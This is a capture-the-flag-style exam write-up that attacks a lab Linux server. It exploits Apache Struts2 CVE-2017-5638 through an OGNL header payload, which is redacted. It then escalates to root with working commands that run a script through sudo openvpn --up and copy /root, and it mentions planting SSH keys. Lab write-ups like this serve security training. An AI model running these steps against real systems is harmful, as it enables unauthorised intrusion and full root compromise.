\# Task 1 — Linux



\*\*CyberEd Portal — HackCamp 2026 Penetration Testing Exam\*\*



| Information    | Details                                                              |

| -------------- | -------------------------------------------------------------------- |

| \*\*Task\*\*       | 1 — Linux                                                            |

| \*\*Difficulty\*\* | Medium                                                               |

| \*\*Objective\*\*  | Hack the server, escalate privileges, and read the flag from `/root` |

| \*\*Target\*\*     | `<TARGET\_IP>`                                                        |

| \*\*Platform\*\*   | CyberEd Portal                                                       |

| \*\*Group\*\*      | 362                                                                  |



\---



\## Attack Chain



```text

Struts2 OGNL RCE

(CVE-2017-5638 / S2-045)

&#x20;       │

&#x20;       ▼

Shell as `tomcat`

&#x20;       │

&#x20;       ▼

sudo NOPASSWD: `/usr/sbin/openvpn`

&#x20;       │

&#x20;       ▼

Privilege Escalation

&#x20;       │

&#x20;       ▼

root

&#x20;       │

&#x20;       ▼

Read `/root` flag

```



\---



\# 1. Reconnaissance



\## Full TCP Port Scan



I started with a full TCP port scan to identify exposed services.



```bash

nmap -p- --min-rate 5000 -T4 <TARGET\_IP> -oN nmap-allports.txt

```



\### Results



```text

80/tcp      HTTP

60022/tcp   SSH

```



The HTTP service was the primary target for further enumeration.



> \*\*Note:\*\* The target appeared to rate-limit or drop aggressive scanning. `nmap` reported some ports as filtered and tools such as `gobuster` experienced timeouts. Individual requests using `curl` worked more reliably, so slower enumeration was preferred.



\---



\# 2. Web Enumeration



I fingerprinted the web application using `curl` and `whatweb`.



```bash

curl -i http://<TARGET\_IP>/

```



```bash

whatweb http://<TARGET\_IP>/

```



The application revealed:



\* Apache-Coyote/1.1

\* Apache Tomcat

\* Redirect to `/showcase.action`

\* \*\*Struts2 Showcase\*\*



The presence of Struts2 Showcase suggested that the application could be vulnerable to known Apache Struts vulnerabilities.



\---



\# 3. Initial Access — CVE-2017-5638 (S2-045)



The application was vulnerable to:



\*\*CVE-2017-5638 — Apache Struts2 S2-045\*\*



This vulnerability allows OGNL expression injection through the `Content-Type` HTTP header, resulting in remote code execution.



\## Confirming Remote Code Execution



I tested command execution by sending an OGNL payload through the vulnerable endpoint:



```bash

curl -s http://<TARGET\_IP>/showcase.action \\

\-H "Content-Type: <OGNL\_PAYLOAD>"

```



The command execution returned:



```text

uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)

```



This confirmed successful remote command execution as the `tomcat` user.



\---



\# 4. Command Execution Wrapper



A reverse shell was considered, but the VPN environment was unreliable and the reverse connection could not reliably route through the training network.



Instead, I used a blind-RCE command wrapper that Base64-encoded commands before sending them through the vulnerable endpoint.



Example usage:



```bash

./rce.sh 'id'

```



```bash

./rce.sh 'uname -a'

```



This provided a convenient way to execute arbitrary commands remotely.



\### Important Observation



The OGNL payload passes the command as a single argument to:



```text

/bin/bash -c

```



Therefore, shell operators such as spaces and pipes can be used directly inside the command.



\---



\# 5. Local Enumeration



After obtaining command execution as `tomcat`, I enumerated the system for privilege-escalation opportunities.



```bash

./rce.sh 'id; sudo -n -l 2>\&1'

```



The important result was:



```text

(root) NOPASSWD: /usr/sbin/openvpn

```



This meant that the `tomcat` user could execute `/usr/sbin/openvpn` as root without providing a password.



I also checked for SUID binaries and basic environment information:



```bash

./rce.sh 'find / -perm -4000 -type f 2>/dev/null'

```



```bash

./rce.sh 'cat /proc/1/cgroup | head'

```



The environment appeared to be running inside a Docker container.



\---



\# 6. Privilege Escalation — sudo OpenVPN



The `sudo` permission on OpenVPN provided the privilege-escalation vector.



OpenVPN supports an `--up` option that executes a specified script when the connection is initialized.



I created a script that would execute commands as root:



```bash

printf '#!/bin/sh

cp -a /root /tmp/rootloot 2>/dev/null

chmod -R 777 /tmp/rootloot

id > /tmp/pwned 2>\&1

' > /tmp/up.sh

```



Then made it executable:



```bash

chmod +x /tmp/up.sh

```



OpenVPN was executed through `sudo` with the script configured as the `--up` script:



```bash

timeout 8 sudo /usr/sbin/openvpn \\

\--dev null \\

\--script-security 2 \\

\--up /tmp/up.sh

```



The resulting output confirmed that the script executed with root privileges:



```text

uid=0(root)

```



The `/root` directory was then copied to a readable location:



```text

/tmp/rootloot

```



\---



\# 7. Flag



The flag was retrieved from the copied `/root` directory.



```text

cybered{YOUR\_FLAG\_HERE}

```



> Replace `YOUR\_FLAG\_HERE` with the flag from your own exam deployment if publishing it is permitted.



\---



\# 8. Alternative Privilege-Escalation Method



Another possible way to use the root-level OpenVPN execution was to have the `--up` script modify `/root/.ssh/authorized\_keys`.



This would allow an SSH connection as root through the exposed SSH service:



```text

SSH port: 60022

```



This approach would provide a full interactive root shell rather than simply copying the `/root` directory.



\---



\# 9. Lessons Learned



\### Reconnaissance



\* Full TCP scanning helped identify the HTTP and non-standard SSH services.

\* Technology fingerprinting was important for identifying the Struts2 application.

\* Aggressive scans can trigger rate limiting in lab environments.



\### Exploitation



\* Struts2 S2-045 allows remote command execution through OGNL injection.

\* Identifying the running user after obtaining RCE is essential.

\* A reliable command-execution wrapper can be useful when reverse shells are unreliable.



\### Privilege Escalation



\* Always check `sudo -l` after obtaining a low-privileged shell.

\* `NOPASSWD` permissions can provide direct privilege-escalation opportunities.

\* OpenVPN can execute an `--up` script with the privileges of the process running it.



\### Network Troubleshooting



\* Reverse shells may fail when VPN routing is unreliable.

\* When interactive connections fail, command execution over the existing HTTP channel can still be effective.

\* Slower scans and individual requests were more reliable against the rate-limited target.



\---



\# 10. References



\* \*\*CVE-2017-5638 — Apache Struts2 S2-045\*\*

\* \*\*GTFOBins — OpenVPN / sudo privilege escalation\*\*



\---



\## Final Attack Path



```text

Port 80

&#x20;  │

&#x20;  ▼

Struts2 Showcase

&#x20;  │

&#x20;  ▼

CVE-2017-5638 / S2-045

&#x20;  │

&#x20;  ▼

Remote Code Execution

&#x20;  │

&#x20;  ▼

tomcat

&#x20;  │

&#x20;  ▼

sudo -l

&#x20;  │

&#x20;  ▼

NOPASSWD: /usr/sbin/openvpn

&#x20;  │

&#x20;  ▼

OpenVPN --up script

&#x20;  │

&#x20;  ▼

root

&#x20;  │

&#x20;  ▼

/root

&#x20;  │

&#x20;  ▼

FLAG

```



